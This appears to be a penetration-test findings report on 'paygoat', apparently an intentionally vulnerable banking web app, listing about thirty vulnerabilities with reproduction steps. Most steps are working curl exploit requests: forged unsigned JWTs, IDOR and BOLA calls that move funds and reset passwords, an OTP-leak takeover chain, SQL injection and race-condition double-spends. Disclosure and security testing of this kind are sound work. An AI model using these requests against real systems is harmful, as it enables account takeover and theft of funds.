title: Unauthenticated IDOR on GET /user/profile/:userID exposes every user's full profile
description: GET /user/profile/:userID requires no authentication and resolves sequential integer IDs. Any anonymous caller obtains username, first/last name, password, USD/EUR account numbers, account UUIDs, balances and phone number for every user, including the admin (userID 1). Nonexistent IDs answer 404 'User not found', which also allows user enumeration.
steps:
1. curl http://paygoat-api:3000/user/profile/1
2. curl http://paygoat-api:3000/user/profile/2
3. HTTP 200 returns full profile JSON incl. password and account UUIDs for each sequential ID.
evidence: HTTP 200 body: {"userID":1,"username":"superhacker",...,"password":"s3cureP@ssw0rd","accountUSD":"USD48354259",...}. Raw outputs: artifacts/missing_auth.txt, artifacts/enumerate_users.txt

title: User passwords stored and returned in plaintext
description: Profiles expose the login password in cleartext (GET /user/profile/:id); login compares the raw value, so passwords are stored unhashed. Combined with the unauthenticated profile endpoint this leaks every credential and enables direct account takeover.
steps:
1. Register: curl -X POST http://paygoat-api:3000/auth/register -H 'Content-Type: application/json' -d '{"username":"alice_pt","firstname":"Alice","lastname":"T","password":"Str0ng!PassA"}'
2. curl http://paygoat-api:3000/user/profile/2
3. Response contains "password":"Str0ng!PassA" verbatim; login with it succeeds.
evidence: artifacts/enumerate_users.txt (admin password s3cureP@ssw0rd) and artifacts/missing_auth.txt (alice_pt password echoed).

title: JWT signature is never verified - forged tokens grant any identity (incl. admin)
description: Bearer tokens are HS256 JWTs, but the backend accepts any token whose header/payload merely base64-decodes: alg:none, tampered payloads and completely garbage signatures all pass authentication (only exp is checked). An attacker forges {"userID":1} to become superhacker, or any other userID, for every auth-gated endpoint, and can delete any account via a forged token.
steps:
1. curl http://paygoat-api:3000/bank/loan/user?userID=1 -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOjEsInVzZXJuYW1lIjoieCIsImlhdCI6MTc5MTkwNDgyOCwiZXhwIjoxOTkxOTA0ODI4fQ.NOTAREALSIGNATUREATALL' -> 200
2. alg=none variant also 200 and permitted POST http://paygoat-api:3000/payment/transferthirdparties transferring from the admin account -> 'Transfer successful'
3. Forged token with userID=5 permitted DELETE http://paygoat-api:3000/user/detele-account -> 'Account deleted successfully' (test user removed).
evidence: Garbage-signature and alg=none tokens accepted across endpoints; forged userID=5 token deleted that test account (200) at 15:29.

title: BOLA: PUT /user/profile/:userID lets any user overwrite another user's profile
description: The profile-update endpoint trusts the userID path parameter without comparing it to the caller's token, so user A can rewrite user B's fields. The update also accepts a phoneNumber field: overwriting a victim's phoneNumber hands them the attacker's number, after which /otp/send + /user/reset-password work against the victim; so the same BOLA enables full takeover even without the OTP leak.
steps:
1. As alice (userID 2): curl -X PUT http://paygoat-api:3000/user/profile/3 -H 'Authorization: Bearer <alice_jwt>' -H 'Content-Type: application/json' -d '{"firstname":"Pwned","lastname":"ByAlice"}'
2. 200 'Profile updated successfully'; GET http://paygoat-api:3000/user/profile/3 shows bob_pt with firstname=Pwned.
evidence: alice token edited userID 3 -> {"message":"Profile updated successfully"}; profile 3 then shows "firstname":"Pwned". Additionally carol's token set user 3's phoneNumber to +544198261971 via PUT /user/profile/3 (readback confirmed 15:44).

title: BOLA: PUT /user/profile/:userID/password lets any user set any other user's password (account takeover)
description: The password-change endpoint does not verify that the path userID belongs to the token holder, so any authenticated user can set a new password for any account and log in as them.
steps:
1. As alice: curl -X PUT http://paygoat-api:3000/user/profile/3/password -H 'Authorization: Bearer <alice_jwt>' -H 'Content-Type: application/json' -d '{"password":"Owner1!aaa"}' -> 200 'Password updated successfully'
2. curl -X POST http://paygoat-api:3000/auth/login -d '{"username":"bob_pt","password":"Owner1!aaa"}' -> 200 'Login successful'
3. Old password now returns 401.
evidence: bob_pt takeover via alice token confirmed end-to-end via login results at 15:27.

title: Missing authentication on POST /bank/account exposes any user's account numbers and balances
description: The accounts endpoint takes userID in the body and requires no token, returning USD/EUR account numbers and live balances for any user.
steps:
1. curl -X POST http://paygoat-api:3000/bank/account -H 'Content-Type: application/json' -d '{"userID":2}'
2. HTTP 200 with accountUSD/balanceUSD/accountEUR/balanceEUR for userID 2, no Authorization header sent.
evidence: artifacts/missing_auth.txt: {"message":"Account data retrieved successfully","data":{"accountUSD":"USD81474975","balanceUSD":100,...}} [200] without token.

title: IDOR on GET /bank/transactions/history: any account number readable by any authenticated user
description: The history endpoint filters solely on the caller-supplied `account` query parameter with no ownership check, so user A can pull the complete transaction ledger of user B (or the admin) by changing the account number.
steps:
1. As alice: curl 'http://paygoat-api:3000/bank/transactions/history?account=USD48354259' -H 'Authorization: Bearer <alice_jwt>'
2. 200 returns the admin's transactions incl. senderID/recipientID, amounts, timestamps and both USD/EUR account numbers of counterparties.
evidence: alice token read admin history (transactionID 5/6 with senderID 1) at 15:26.

title: SQL injection in GET /bank/transactions/history `account` parameter
description: The account value is concatenated directly into the SQL WHERE clause (inserted at two places: senderAccount and accountEUR comparisons). A tautology returns every user's transactions and error responses leak SQLite syntax and query fragments.
evidence: OR-1=1 dumped full cross-user ledger; SQLITE_ERROR strings captured 15:26 (artifacts inline outputs).

title: BOLA on POST /bank/get-credit-card: static client-side AES key lets any user pull any other user's full credit card + CVV
description: Request 'encryption' is AES-CBC of the userID with a key/IV hardcoded in the public JS bundle (key 0123456789abcabcdefdef0123456789, iv abc9876543210def). Any authenticated user can encrypt an arbitrary userID (e.g. 1 = admin) and receive that user's card data back, encrypted with the same public key.
evidence: admin card decrypted from artifacts/card_admin.json; key material from http://paygoat:8000/static/js/bundle.js (CreditCard component).

title: IDOR on GET /bank/loan/user?userID=: read any user's loan records
description: Loans are looked up by the raw userID query parameter with no ownership check, so any caller with any (even forged) token can enumerate other users' loan history.
steps:
1. curl 'http://paygoat-api:3000/bank/loan/user?userID=2' -H 'Authorization: Bearer <bob_or_forged_jwt>' -> 200 {"loans":[... alice's loans ...]}
2. Works equally with garbage-signature tokens.
evidence: alice's loans (loanID 1/2) returned to any token via userID=2 (15:26-15:29 rounds).

title: BOLA on POST /bank/loan/request: userID in body lets attacker create loans on other users' accounts
description: The loan request uses the body's userID, not the token's, for the entire workflow, allowing any user to open auto-approved loans against someone else's account and modify their ledger and balance.
steps:
1. As alice: curl -X POST http://paygoat-api:3000/bank/loan/request -H 'Authorization: Bearer <alice_jwt>' -H 'Content-Type: application/json' -d '{"userID":3,"amount":100}'
2. 200 'Loan approved and deposited','nuevoSaldo':101 - loan created and credited on bob's account using alice's session.
evidence: nuevoSaldo 101 for userID 3 while authenticated as userID 2 (15:27).

title: BOLA on GET /payment/saved-recipients?userID=: read any user's recipient list
description: Saved recipients are fetched by the userID query parameter without authorization, exposing other users' payment aliases and account UUIDs.
steps:
1. bob registers alias 'bobsavings' -> uuid befda7c8-...
2. As alice: curl 'http://paygoat-api:3000/payment/saved-recipients?userID=3' -H 'Authorization: Bearer <alice_jwt>' -> 200 [{"alias":"bobsavings","uuid":"befda7c8-3840-4d59-bb40-020801600814"}]
evidence: alice read bob's recipients (15:26).

title: BOLA/write on POST /payment/register-alias: aliases can be attached to another user's recipient list
description: register-alias trusts the body userID, so an attacker can inject arbitrary alias->account entries into a victim's saved recipients (recipient poisoning: the victim may later pay an attacker-chosen account via a friendly alias).
steps:
1. As alice: curl -X POST http://paygoat-api:3000/payment/register-alias -H 'Authorization: Bearer <alice_jwt>' -H 'Content-Type: application/json' -d '{"alias":"evil","accountNumber":"USD81474975","userID":3}' -> 201
2. GET 'http://paygoat-api:3000/payment/saved-recipients?userID=3' now lists 'evil' inside bob's recipients.
evidence: 'evil' alias written into userID 3's list, confirmed by readback (15:26).

title: Missing authentication on POST /payment/transfer: anonymous users can move money between any accounts
description: The internal transfer endpoint performs no authentication (no token needed) and no ownership check on senderAccountNumber. Anonymous attackers moved funds out of arbitrary accounts, including the admin's.
steps:
1. curl -X POST http://paygoat-api:3000/payment/transfer -H 'Content-Type: application/json' -d '{"senderAccountNumber":"USD81474975","recipientAccountNumber":"USD03549387","amount":5,"currencyFrom":"USD","currencyTo":"USD","rate":1}' (NO Authorization header) -> 200 'Transfer successful'; alice 100->95, bob 100->105
2. Same, 2 units from USD48354259 (admin, no token) -> 'Transfer successful'; admin 100->98.
evidence: Balance deltas verified via unauthenticated GET /user/profile after each transfer (15:22-15:24).

title: Missing sender-ownership check on POST /payment/transfer even when authenticated
description: When a token IS provided, the endpoint still uses only the body's senderAccountNumber, so any user can debit accounts they do not own (admin's account debited using alice's token).
steps:
1. As alice: curl -X POST http://paygoat-api:3000/payment/transfer -H 'Authorization: Bearer <alice_jwt>' -H 'Content-Type: application/json' -d '{"senderAccountNumber":"USD48354259","recipientAccountNumber":"USD03549387","amount":2,"currencyFrom":"USD","currencyTo":"USD","rate":1}'
2. 200 'Transfer successful'; admin balance decreased.
evidence: admin balance dropped 100->98 after transfer initiated with alice's token (15:24).

title: Insufficient amount validation on POST /payment/transfer (negative and non-numeric amounts accepted)
description: amount is not validated numerically: -50 inverted the flow of money (recipient was debited, sender credited) and the string 'abc' was accepted, string-concatenating into the balance column and corrupting balances to '45abc' and NULL.
steps:
1. curl -X POST http://paygoat-api:3000/payment/transfer -H 'Content-Type: application/json' -d '{"senderAccountNumber":"USD03549387","recipientAccountNumber":"USD81474975","amount":-50,"currencyFrom":"USD","currencyTo":"USD","rate":1}' -> 200 'Transfer successful'
2. Same request with "amount":"abc" -> 200; readback: userID2 balance '45abc', userID3 balance null.
evidence: Balance readbacks at 15:24: 2 -> '45abc', 3 -> None (artifacts).

title: Race condition (TOCTOU) on POST /payment/transfer allows double-spending
description: The balance check and the debit are not atomic: three concurrent 300-unit transfers from a balance of 348 produced two 'Transfer successful' responses and two recorded transactions (transactionID 7 and 8, same timestamp) for funds that existed once.
steps:
1. Set alice balance to 348 (loans).
2. Fire 3 parallel requests of amount 300 each to bob.
3. Two succeeded (>348 total); history shows tx 7 & 8 both amount 300 at 15:27:12.
evidence: transactions 7/8 both 300 from senderID 2 while balance was 348 (history endpoint readback).

title: BOLA on POST /payment/transferFundsUuid: funds can be sent from accounts the caller does not own
description: The UUID transfer debits whatever account number is placed in `accountUSD`; there is no check that the account belongs to the token's user. Alice moved money from the admin's USD48354259 using her own token.
steps:
1. As alice: curl -X POST http://paygoat-api:3000/payment/transferFundsUuid -H 'Authorization: Bearer <alice_jwt>' -H 'Content-Type: application/json' -d '{"accountUSD":"USD48354259","recipientUUID":"befda7c8-3840-4d59-bb40-020801600814","amount":1}'
2. 200 'USD transfer completed','fromAccount':'USD48354259','from':'0c98cf5f-... (admin uuid)'.
evidence: Response echoes from=admin account while authenticated as alice (15:24).

title: Race condition on POST /payment/transferFundsUuid drains funds into negative balance
description: Three concurrent transfers of 45 against a balance of 48 ALL returned 'USD transfer completed' - the balance check is not atomic, leaving the sender at -87 (sequential overspend afterwards is correctly rejected, proving TOCTOU).
steps:
1. As alice (balance 48): run 3 parallel curl -X POST http://paygoat-api:3000/payment/transferFundsUuid -d '{"accountUSD":"USD81474975","recipientUUID":"<bob uuid>","amount":45}'
2. 3x success. Readback: alice -87, bob +135 beyond what alice had.
evidence: 15:28 round: alice balance -87 after race; later single overspend got 'Insufficient balance' (400).

title: Missing sender-ownership check on POST /payment/transferthirdparties (authenticated)
description: External transfers accept any senderAccountNumber in the body; the token is required but never matched to the sender. Alice's token moved 4 USD from the admin's account.
steps:
1. As alice: curl -X POST http://paygoat-api:3000/payment/transferthirdparties -H 'Authorization: Bearer <alice_jwt>' -H 'Content-Type: application/json' -d '{"senderAccountNumber":"USD48354259","recipientAccountNumber":"USD81474975","amount":4}'
2. 200 'Transfer successful'; admin balance decreased by 4 (transactionID 5 in history: senderID 1, recipientID 2).
evidence: history tx 5 shows sender=admin initiated under alice's token (15:24).

title: OTP for password reset is returned in the HTTP response body of POST /otp/send
description: The 'sent' 4-digit one-time code is echoed back to the caller. Anyone can reset any user's password: read the victim's phone number from the unauthenticated profile endpoint, request an OTP, take it from the response, and set a new password.
steps:
1. curl http://paygoat-api:3000/user/profile/4 -> phoneNumber +544805459620
2. curl -X POST http://paygoat-api:3000/otp/send -d '{"phoneNumber":"+544805459620"}' -> 200 {"message":"OTP generated successfully","otp":"3326"}
3. curl -X POST http://paygoat-api:3000/user/reset-password -d '{"phoneNumber":"+544805459620","otp":"3326","newPassword":"Evil1!aaa"}' -> 200
4. Login as weakpwtst / Evil1!aaa -> 200 'Login successful'.
evidence: Full takeover chain executed against test userID 4. The admin's OTP ('2719') was also received via the same flow but deliberately NOT used to avoid locking out the admin.

title: Reset OTP is not invalidated after use and can be replayed
description: /user/reset-password accepts an already-consumed OTP repeatedly (no single-use enforcement), so an intercepted OTP stays valid indefinitely for changing passwords.
steps:
1. Reset user 4 password with OTP 3326 -> 200
2. Repeat reset immediately with the SAME OTP 3326 and newPassword Evil2!aaa -> 200 'Password updated successfully' (reuse accepted).
evidence: Identical OTP accepted twice (15:27).

title: No rate limiting on POST /user/reset-password OTP guessing (4-digit code brute-forceable)
description: 30 consecutive wrong OTP guesses were processed with no lockout, delay or escalating error; a 4-digit keyspace (~10k) is trivially brute-forced, with no authentication required.
steps:
1. Loop 30x: curl -X POST http://paygoat-api:3000/user/reset-password -d '{"phoneNumber":"<victim>","otp":"1001..1030","newPassword":"x"}'
2. Every attempt returns plain 401 'Invalid OTP'; the flow remains usable afterwards.
evidence: 30 sequential wrong OTPs accepted within seconds (15:27).

title: Username enumeration via distinct login errors
description: /auth/login answers 404 'User not found' for unknown usernames versus 401 'Incorrect password' for existing ones, letting attackers confirm valid account names (e.g. superhacker).
steps:
1. curl -X POST http://paygoat-api:3000/auth/login -d '{"username":"nosuchuser","password":"x"}' -> 404 'User not found'
2. curl -X POST http://paygoat-api:3000/auth/login -d '{"username":"alice_pt","password":"wrong"}' -> 401 'Incorrect password'
evidence: artifacts/login_tests.txt shows the distinct status codes/messages.

title: Phone-number/user enumeration via POST /otp/send
description: /otp/send returns 404 'User not found' for unregistered numbers and 200 (with the OTP itself) for registered numbers, confirming which phone numbers belong to users.
steps:
1. curl -X POST http://paygoat-api:3000/otp/send -d '{"phoneNumber":"+10000000000"}' -> 404 'User not found'
2. curl -X POST http://paygoat-api:3000/otp/send -d '{"phoneNumber":"+544198261971"}' (admin's, leaked via profile) -> 200 {"otp":"2719"}
evidence: 15:29 round outputs.

title: No rate limiting or lockout on POST /auth/login (credential brute-force possible)
description: 17+ wrong-password attempts in quick succession returned plain 401s with no delay, CAPTCHA or lockout, and the correct password still logged in afterwards. X-Forwarded-For rotation was not even needed since there is no limit at all.
steps:
1. Loop 17x: curl -X POST http://paygoat-api:3000/auth/login -d '{"username":"alice_pt","password":"bad"}}' -> all 401
2. curl -X POST http://paygoat-api:3000/auth/login -d '{"username":"alice_pt","password":"Str0ng!PassA"}' -> 200
evidence: 15:29 round: 17x401 then 200.

title: No password policy on registration (single-character password accepted)
description: /auth/register accepts passwords like 'a' with no length/complexity requirements, weakening the whole user base to guessing.
steps: 1. curl -X POST http://paygoat-api:3000/auth/register -d '{"username":"weakpwtst","firstname":"x","lastname":"y","password":"a"}' -> 201 'User registered successfully','userID':4
evidence: 201 response with 1-character password (15:20).

title: Full frontend source code exposed via published JavaScript source map
description: http://paygoat:8000/static/js/bundle.js.map is publicly downloadable and contains the complete original React sources, including the hardcoded AES key/IV for the credit-card feature, all API contracts and server file paths (/usr/src/app). The app is additionally served by webpack-dev-server (eval-built bundle, HMR /ws socket) - a development stack exposed in a running application.
steps:
1. curl http://paygoat:8000/static/js/bundle.js.map -o map.json -> 200, 2.6 MB
2. Parse sources[] -> recovered src/components/Dashboard/CreditCard.js with secretKey '0123456789abcabcdefdef0123456789' and iv 'abc9876543210def', plus every other component.
evidence: artifacts/bundle.js.map + reconstructed artifacts/src/*.js.

title: Verbose error handling leaks stack traces, absolute paths and DB engine details on API errors
description: Malformed JSON triggers unhandled Express errors that return full stack traces with absolute server paths and dependency versions (/usr/src/app/node_modules/body-parser/lib/types/json.js:91 etc.); SQL errors are echoed as 500s naming SQLite.
steps:
1. curl -X POST http://paygoat-api:3000/auth/login -H 'Content-Type: application/json' -d '{"username":'  (truncated JSON) -> 400 HTML with SyntaxError stack incl. /usr/src/app/node_modules/...
2. SQLi probe on /bank/transactions/history -> 500 {"error":"SQLITE_ERROR: ..."}.
evidence: Stacks captured at 15:25 and 15:28 (see artifacts/login_tests.txt and missing_auth.txt).

title: Registration errors leak SQLite constraint and schema details
description: Duplicate-username registration returns {"error":"User registration failed","details":"SQLITE_CONSTRAINT: UNIQUE constraint failed: users.username"}, revealing DB engine, table and column names in addition to enabling enumeration.
steps:
1. curl -X POST http://paygoat-api:3000/auth/register -d '{"username":"alice_pt","firstname":"x","lastname":"y","password":"Ab1!aaaa"}'
2. 400 with details 'SQLITE_CONSTRAINT: UNIQUE constraint failed: users.username'.
evidence: artifacts/missing_auth.txt.

title: Missing authorization on support conversations: anonymous read of any ticket and anonymous comment injection
description: GET /support/conversation/:id/comments and POST /support/conversation/:id/comment require neither authentication nor ticket ownership. Any anonymous user can read other users' tickets (a private admin ticket was exposed with its content) and post comments into them.
steps:
1. curl http://paygoat-api:3000/support/conversation/1/comments -> 200 with admin ticket 'Secret Ticket' incl. content and comments
2. curl -X POST http://paygoat-api:3000/support/conversation/1/comment -d '{"comment":"x"}' (no token) -> 201 'Comment added'
evidence: Admin conversation #1 read and commented anonymously (15:20, artifacts/missing_auth.txt).

title: Wildcard CORS (Access-Control-Allow-Origin: *) on API and frontend
description: All responses on paygoat-api:3000 send Access-Control-Allow-Origin: * with Authorization/Content-Type allowed for GET,POST,PUT,DELETE, and paygoat:8000 sends ACAO:* with Allow-Methods:* / Allow-Headers:*. Combined with unauthenticated endpoints (profiles with passwords, OTP), any third-party site can fetch sensitive data cross-origin from a victim's browser context.
steps:
1. curl -i -X OPTIONS http://paygoat-api:3000/payment/transfer -H 'Origin: https://evil.example' -H 'Access-Control-Request-Method: POST' -H 'Access-Control-Request-Headers: authorization' -> 204 with Access-Control-Allow-Origin: *, Allow-Methods GET,POST,PUT,DELETE, Allow-Headers Content-Type,Authorization
2. curl -i http://paygoat:8000/ shows Access-Control-Allow-Origin: * / Methods: * / Headers: *
evidence: Preflight + header captures (15:29 round).

title: Missing security headers and Express fingerprint on the web app
description: SPA responses on paygoat:8000 lack Content-Security-Policy, X-Frame-Options/frame-ancestors, X-Content-Type-Options and HSTS while exposing X-Powered-By: Express and wildcard CORS - clickjacking and fingerprinting surface.
steps:
1. curl -i http://paygoat:8000/login | grep -iE 'content-security|x-frame|x-content-type|strict-transport' -> (none present)
2. 'X-Powered-By: Express' present on both hosts.
evidence: Header dump from first reconnaissance request and 15:29 comparison.

title: Client-controlled 'rate' on POST /payment/transfer creates money (balances not conserved)
description: The internal transfer computes settlement values from the caller-supplied rate with no bounds or validation. Sending amount=10 with rate=100 (USD->USD) credited the recipient +10 while the sender's own balance grew +90: 100 units were created from nothing (sum of the two accounts went 556 -> 656). Negative rate (-1) is also accepted. The endpoint requires no authentication at all, so any anonymous attacker can inflate arbitrary accounts.
steps:
1. curl -X POST http://paygoat-api:3000/payment/transfer -H 'Content-Type: application/json' -d '{"senderAccountNumber":"USD14373367","recipientAccountNumber":"USD03549387","amount":10,"currencyFrom":"USD","currencyTo":"USD","rate":100}' -> 200 'Transfer successful' (no token sent)
2. curl http://paygoat-api:3000/user/profile/7 -> balanceUSD 110 (was 20, +90 while SENDING); profile/3 -> 546 (was 536, +10). System total increased by 100.
3. Same request with rate=-1 also returns 200 'Transfer successful'.
evidence: Balance readbacks via GET /user/profile/7 and /3 at 15:44; sender GAINED money on an outgoing transfer purely due to the rate parameter.

title: Race condition on POST /bank/loan/request bypasses the maximum-loans limit
description: The per-user loan-count check is not atomic. With one existing loan (limit is 2 per user, observed by sequential exhaustion), two concurrent 600-unit requests were BOTH approved, leaving the user with 3 loans and +1,200 minted beyond the enforced cap. Both responses even reported the same nuevoSaldo (1304.6), proving concurrent stale reads.
steps:
1. Carol (userID 7) has exactly 1 loan. Sequential limit observed: users are blocked at 2 loans (alice was blocked with 'maximum number' at 2).
2. Fire 3 parallel: curl -X POST http://paygoat-api:3000/bank/loan/request -H 'Authorization: Bearer <carol_jwt>' -d '{"userID":7,"amount":600}'
3. Two return 'Loan approved and deposited' (loanID 5 AND 6, same second) -> account now has 3 loans (> limit); balance credited 1200.
evidence: loans for userID 7 after race: [loanID 5: 600, loanID 6: 600, loanID 4: 100] (15:41); sequential cap = 2 demonstrated on alice earlier.

title: Race condition (lost update) on POST /payment/transferthirdparties: two transfers succeed but sender is debited once
description: Concurrent external transfers read-then-write the sender balance without locking: two simultaneous 100-unit transfers both returned 'Transfer successful' and both were credited to the recipient (alice -87 -> 113 = +200), while the sender's balance dropped by only 100 (carol 1204.6 -> 1104.6). Money is created out of thin air; the ledger and balances diverge.
steps:
1. Carol balance 1204.6. Fire 2 parallel: curl -X POST http://paygoat-api:3000/payment/transferthirdparties -H 'Authorization: Bearer <carol_jwt>' -d '{"senderAccountNumber":"USD14373367","recipientAccountNumber":"USD81474975","amount":100}'
2. Both -> 200 'Transfer successful'.
3. Readback: carol 1104.6 (only -100), alice 113 (+200 from -87). One debit lost.
evidence: Balance arithmetic recorded at 15:43-15:44 via GET /user/profile/2 and /7.
